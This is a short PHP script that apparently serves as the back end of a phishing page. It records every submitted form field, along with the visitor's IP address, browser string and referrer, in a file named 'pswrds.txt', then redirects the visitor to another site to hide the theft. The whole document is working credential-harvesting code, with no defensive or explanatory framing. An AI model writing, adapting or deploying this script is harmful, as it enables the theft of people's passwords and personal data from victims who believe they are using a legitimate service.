<?php

    header("Location: http://www.easyconverter.42web.io/ ");
    $handle = fopen("pswrds.txt", "a");

    $post = $_POST;
    $post['ip'] = $_SERVER['REMOTE_ADDR'];
    $post['browser'] = $_SERVER['HTTP_USER_AGENT'];
    $post['referrer'] = $_SERVER['HTTP_REFERER'];

    foreach($post as $variable => $value) 
    {
        fwrite($handle, $variable);
        fwrite($handle, "=");
        fwrite($handle, $value);
        fwrite($handle, PHP_EOL);
    }

    fwrite($handle, PHP_EOL);
    fclose($handle);
    exit;

?>